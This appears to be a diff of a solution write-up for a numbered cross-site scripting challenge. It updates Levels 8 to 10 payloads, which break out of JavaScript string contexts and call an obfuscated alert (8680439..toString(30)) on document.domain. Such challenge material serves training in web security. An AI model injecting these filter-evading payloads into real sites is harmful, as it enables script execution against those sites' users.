@@ -54,22 +54,22 @@
 
 - Level 8
 ```javascript
-"};this[8680439..toString(30)](1);//
+"};this[8680439..toString(30)](document.domain);//
 ```
 
 - Level 8.1
 ```javascript
-"};this[8680439..toString(30)](1);{"
+"};this[8680439..toString(30)](document.domain);{"
 ```
 
 - Level 9
 ```javascript
-'};this[8680439..toString(30)](1);{'
+'};this[8680439..toString(30)](document.domain);{'
 ```
 
 - Level 10
 ```javascript
-';this[8680439..toString(30)](1);'
+';this[8680439..toString(30)](document.domain);//'
 ```
 or,
 ```javascript
